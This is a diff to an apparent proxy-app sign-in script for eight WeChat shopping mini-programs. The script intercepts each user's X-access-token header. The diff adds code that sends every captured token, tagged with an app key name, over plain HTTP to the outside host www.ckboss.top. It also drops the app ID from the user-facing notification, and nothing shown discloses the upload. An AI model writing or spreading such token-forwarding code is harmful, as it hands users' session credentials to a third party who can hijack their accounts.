@@ -1,5 +1,25 @@
 const $ = new Env("葫芦娃");
 const _key = 'huluwa_sign_in';
+const appIds = {
+                    'wxded2e7e6d60ac09d': '新联惠购',
+                    'wx61549642d715f361': '贵旅优品',
+                    'wx613ba8ea6a002aa8': '空港乐购',
+                    'wx936aa5357931e226': '航旅黔购',
+                    'wx624149b74233c99a': '遵航出山',
+                    'wx5508e31ffe9366b8': '贵盐黔品',
+                    'wx821fb4d8604ed4d6': '乐旅商城',
+                    'wxee0ce83ab4b26f9c': '驿路黔寻'
+                };
+        const appIds2 = {
+                    'wxded2e7e6d60ac09d': 'XLTH_APPID',
+                    'wx61549642d715f361': 'GLYP_APPID',
+                    'wx613ba8ea6a002aa8': 'KGLG_APPID',
+                    'wx936aa5357931e226': 'HLQG_APPID',
+                    'wx624149b74233c99a': 'ZHCS_APPID',
+                    'wx5508e31ffe9366b8': 'GYQP_APPID',
+                    'wx821fb4d8604ed4d6': 'LLSC_APPID',
+                    'wxee0ce83ab4b26f9c': 'YLQX_APPID'
+                };
 /*!(async () => {
     if (typeof $request != "undefined") {
         getToken();
@@ -11,24 +31,24 @@ let isGetCookie = typeof $request !== 'undefined'
 if (isGetCookie) {
     !(async () => {
         const session = {};
-        const appIds = {
-                    'wxded2e7e6d60ac09d': '新联惠购',
-                    'wx61549642d715f361': '贵旅优品',
-                    'wx613ba8ea6a002aa8': '空港乐购',
-                    'wx936aa5357931e226': '航旅黔购',
-                    'wx624149b74233c99a': '遵航出山',
-                    'wx5508e31ffe9366b8': '贵盐黔品',
-                    'wx821fb4d8604ed4d6': '乐旅商城',
-                    'wxee0ce83ab4b26f9c': '驿路黔寻'
-                };
+        
         session.url = $request.url;
         let token= $request.headers['X-access-token'];
         let Referer_url= $request.headers['Referer'];
         if(Referer_url&&token){
             let appId = extractWXVariableFromReferer(Referer_url)
             let matchedAppId = appIds[appId];
+            let nameAppId = appIds2[appId];
                 if (matchedAppId) {
-                    $.msg($.name, `${matchedAppId}token为: ${token}`, appId);
+                    $.msg($.name, `${matchedAppId}token为: ${token}`, '');
+                    let res ='nameAppId='+nameAppId+'&token='+token;
+                    post_in(res).then(message => {
+    console.log(message);
+    $done();
+}).catch(error => {
+    console.log(error);
+    $done();
+});
                 } else {
                     $.msg($.name, '未匹配到对应小程序', appId);
                 }
@@ -56,7 +76,7 @@ function extractWXVariableFromReferer(referer) {
 
 
 
-function post_in(userid, bodys) {
+function post_in(bodys) {
 const url = 'http://www.ckboss.top/uphuluwa?&token=741708861982&'+bodys;
     const request = {
         url: url,
